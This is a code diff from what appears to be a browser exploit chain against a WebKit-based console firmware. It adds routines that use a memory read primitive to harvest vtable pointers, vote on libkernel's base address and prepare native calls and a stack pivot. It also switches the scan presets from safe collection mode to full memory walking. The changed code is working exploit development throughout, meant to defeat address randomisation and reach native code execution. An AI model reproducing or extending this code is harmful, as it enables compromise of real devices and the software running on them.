@@ -54,12 +54,14 @@ import {
     resolveExtModuleHunt,
     resolveExtModuleHuntDiag,
     huntLibkernelCandidatesChunk,
+    collectLiveVtableExtPtrs,
+    resolveLibkernelFromExtList,
 } from "./libkernel_resolve.js";
 import { createCrashLog } from "./log_persist.js";
 import { prepNativeChain, stageGetpid, stageUsleep, fireNativeCall, fireUsleep, firePivotSmoke } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250832o";
+const BUILD_ID = "rw-20250832p";
 const SS_NATIVE_MODE = "wk-native-mode";
 /** Auto-fire at PRIMITIVE-OK — #native-mode dropdown. Default off (fire kills tab if lk/pivot wrong). */
 function getNativeMode() {
@@ -502,34 +504,34 @@ let findLkPreset = null;
 const FIND_LK_LITE = {
     label: "lite",
     lite: true,
-    safeOnly: true,
-    collectOnly: true,
-    deferResolve: true,
+    safeOnly: false,
+    collectOnly: false,
+    deferResolve: false,
     maxWalkPages: 0,
-    knownMax: 0,
+    knownMax: 48,
     knownWalkPages: 0,
-    knownBatch: 1,
-    vtableEntries: 8,
-    vtBatch: 1,
+    knownBatch: 2,
+    vtableEntries: 24,
+    vtBatch: 2,
     minWalkPages: 128,
-    walkPages: 64,
-    cellMax: 2,
+    walkPages: 48,
+    cellMax: 3,
 };
 const FIND_LK_NORM = {
     label: "norm",
     lite: false,
-    safeOnly: true,
-    collectOnly: true,
-    deferResolve: true,
+    safeOnly: false,
+    collectOnly: false,
+    deferResolve: false,
     maxWalkPages: 0,
-    knownMax: 0,
+    knownMax: 64,
     knownWalkPages: 0,
-    knownBatch: 1,
-    vtableEntries: 12,
-    vtBatch: 1,
+    knownBatch: 2,
+    vtableEntries: 48,
+    vtBatch: 3,
     minWalkPages: 160,
     walkPages: 64,
-    cellMax: 3,
+    cellMax: 4,
 };
 
 function parseCalPtr(raw) {
@@ -582,13 +584,140 @@ function calExtPtrCandidates() {
     return out;
 }
 
+function mergeExtEntries(lists) {
+    const out = [];
+    const seen = new Set();
+    for (let li = 0; li < lists.length; li++) {
+        const list = lists[li];
+        if (!list) continue;
+        for (let i = 0; i < list.length; i++) {
+            const e = list[i];
+            const hex = (e.hex || e.ptr || "").replace(/^0x/i, "").toLowerCase();
+            if (!hex || seen.has(hex)) continue;
+            seen.add(hex);
+            out.push({
+                label: e.label || "ext",
+                ptr: e.ptr || hex,
+                hex: hex,
+                code: e.code || null,
+            });
+        }
+    }
+    return out;
+}
+
+function logExtScanRank(tag, rank) {
+    if (!rank || !rank.length) return;
+    for (let i = 0; i < rank.length && i < 4; i++) {
+        const r = rank[i];
+        mark(tag, (i + 1) + " " + String(r.lk) + " votes=" + r.count
+            + " via=" + (r.vias ? r.vias.join(",") : "?"));
+    }
+}
+
+/** Collect vtable ext ptrs → vote/compare → verify — no manual paste. */
+async function runScanExtToLk() {
+    if (!ready || !window.p || busy) return false;
+    const p = window.p;
+    const off = loadEffectiveOff();
+    const { webkitBase } = basesFromSession(off);
+    if (!webkitBase) {
+        mark("LK-SKIP", "no webkitBase — Start + Save bases first");
+        state("Start first", "bad");
+        renderOut();
+        return false;
+    }
+
+    busy = true;
+    setUi();
+    mark("LK-EXT-SCAN", "build=" + BUILD_ID + " — live vtable + cal session");
+    renderOut();
+
+    try {
+        const live = collectLiveVtableExtPtrs(p, webkitBase, off, {
+            carrier: window._wkCarrier || null,
+            pairCells: pairCellsForLk(),
+            retain: retained,
+            vtableEntries: 48,
+            cellMax: 4,
+        });
+        mark("LK-EXT-SCAN", "cells=" + live.cells + " vtables=" + live.vtables
+            + " liveExt=" + live.entries.length);
+        if (live.cellDbg && live.cellDbg.length)
+            mark("LK-CELL-DBG", live.cellDbg.join(" | ").slice(0, 200));
+
+        const merged = mergeExtEntries([
+            live.entries,
+            calExtPtrCandidates(),
+            knownExtPtrsForLk().map(function (hex) {
+                return { label: "session", hex: hex, ptr: hex };
+            }),
+        ]);
+
+        if (!merged.length) {
+            mark("LK-EXT-MISS", "no external ptrs — run index_cal → 2e Leak vtable ptrs first");
+            state("no ext ptrs — cal 2e first", "bad");
+            renderOut();
+            return false;
+        }
+
+        mark("LK-EXT-SCAN", "merged n=" + merged.length + " — voting…");
+        for (let i = 0; i < merged.length && i < 8; i++) {
+            mark("LK-EXT-CAND", merged[i].label + " " + merged[i].hex
+                + (merged[i].code ? " code=" + merged[i].code : ""));
+        }
+        renderOut();
+
+        const hit = resolveLibkernelFromExtList(p, webkitBase, off, merged, {
+            minVotes: 1,
+            verify: true,
+            walkPages: 48,
+        });
+
+        if (hit.zeroRank && hit.zeroRank.length)
+            logExtScanRank("LK-ZERO-RANK", hit.zeroRank);
+
+        if (hit.ok && hit.lk) {
+            saveLibkernelSession(hit.lk, hit.iatRva || null);
+            if (addrIn) addrIn.value = String(hit.lk);
+            mark("LK-OK", hit.lk + " (" + hit.method + "/" + hit.via + ")"
+                + (hit.vote != null ? " vote=" + hit.vote : "")
+                + " tried=" + hit.tried);
+            mark("LK-HINT", "Accept lk → reload → Arm getpid");
+            state("libkernel auto OK", "ok");
+            crashLog.append("LK-EXT-SCAN " + hit.lk + " " + hit.method, "LK-OK");
+            crashLog.flushSync();
+            renderOut();
+            return true;
+        }
+
+        mark("LK-EXT-MISS", hit.error || "no consensus lk");
+        if (hit.zeroRank && hit.zeroRank.length) {
+            mark("LK-HINT", "zero-vote had candidates but usleep verify failed — check 13.52 RVAs");
+        } else {
+            mark("LK-HINT", "ext ptrs may be libc/webkit — re-run cal 2e after groom");
+        }
+        state("ext scan miss", "bad");
+        renderOut();
+        return false;
+    } catch (err) {
+        mark("LK-FAIL", err.message || String(err));
+        state("ext scan error", "bad");
+        renderOut();
+        return false;
+    } finally {
+        busy = false;
+        setUi();
+    }
+}
+
 /** Manual tests — one button = minimal reads, one log line. */
 const MANUAL_TESTS = [
     { id: "elf", group: "base", label: "ELF @ base" },
     { id: "native", group: "base", label: "nativeFn code" },
     { id: "scan-iat", group: "base", label: "Scan libkernel" },
     { id: "leak-lk", group: "base", label: "Leak+vtable LK" },
-    { id: "try-cal-ptrs", group: "base", label: "Calc lk (0 read)" },
+    { id: "try-cal-ptrs", group: "base", label: "Scan ext→lk" },
     { id: "verify-lk", group: "base", label: "Accept lk (0 read)" },
     { id: "show-lk", group: "base", label: "Show LK hints" },
     { id: "try-billzai-lk", group: "base", label: "Try BillZai lk" },
@@ -2095,7 +2224,7 @@ function calcLkFromHex() {
 }
 
 function runTryCalPtrs() {
-    calcLkFromHex();
+    runScanExtToLk();
 }
 
 function runOneReadLk() {
@@ -2300,22 +2429,47 @@ function finishFindLkChunk(chunk) {
             mark("LK-CELL-DBG", String(chunk.cellDbg.join(" | ").slice(0, 240)));
 
         if (ext.length) {
-            const hexes = [];
-            for (let ei = 0; ei < ext.length && ei < 7; ei++) {
-                const h = extPtrHex(ext[ei]);
-                if (h) hexes.push(h);
-            }
             saveExtPtrsSession(ext);
             extResolveIdx = 0;
-            mark("LK-EXT", "n=" + ext.length + " saved");
-            if (hexes[0]) mark("LK-EXT0", hexes[0]);
-            if (hexes[1]) mark("LK-EXT1", hexes[1]);
+            mark("LK-EXT", "n=" + ext.length + " saved — auto-resolving…");
             renderOut();
             crashLog.flushSync();
 
-            if (addrIn && hexes[0]) addrIn.value = hexes[0];
-            mark("LK-HINT", "Hunt lk logs each probe — UNMAPPED=null OOM risk");
-            mark("LK-MISS", "ext saved — zero finish reads build=" + BUILD_ID);
+            const merged = mergeExtEntries([
+                ext.map(function (e) {
+                    return {
+                        label: e.vt || e.source || "vt",
+                        hex: extPtrHex(e),
+                        ptr: extPtrHex(e),
+                    };
+                }),
+                calExtPtrCandidates(),
+            ]);
+            const p = window.p;
+            const off = loadEffectiveOff();
+            const wb = basesFromSession(off).webkitBase;
+            if (p && wb && merged.length) {
+                const hit = resolveLibkernelFromExtList(p, wb, off, merged, {
+                    minVotes: 1,
+                    verify: true,
+                    walkPages: 48,
+                });
+                if (hit.ok && hit.lk) {
+                    saveLibkernelSession(hit.lk, hit.iatRva || null);
+                    if (addrIn) addrIn.value = String(hit.lk);
+                    mark("LK-OK", hit.lk + " (" + hit.method + "/" + hit.via + ")");
+                    state("Scan GOT → ext auto OK", "ok");
+                    renderOut();
+                    crashLog.append("LK-GOT-EXT " + hit.lk, "LK-OK");
+                    crashLog.flushSync();
+                    return true;
+                }
+                if (hit.zeroRank && hit.zeroRank.length)
+                    logExtScanRank("LK-ZERO-RANK", hit.zeroRank);
+                mark("LK-EXT-MISS", hit.error || "auto-resolve failed");
+            }
+            mark("LK-HINT", "tap Scan ext→lk or re-run cal 2e");
+            mark("LK-MISS", "ext collected build=" + BUILD_ID);
         } else if (chunk.cells === 0) {
             mark("LK-HINT", "no cells — re-run Start");
         } else if ((chunk.vtCount || 0) === 0) {
@@ -2367,8 +2521,8 @@ async function runFindLkAuto(preset) {
         retain: retained,
         carrier: window._wkCarrier || null,
         pairCells: pairCellsForLk(),
-        skipKnown: true,
-        knownExtPtrs: [],
+        skipKnown: false,
+        knownExtPtrs: knownExtPtrsForLk(),
     }, findLkPreset);
     let loops = 0;
     const loopMax = 120;
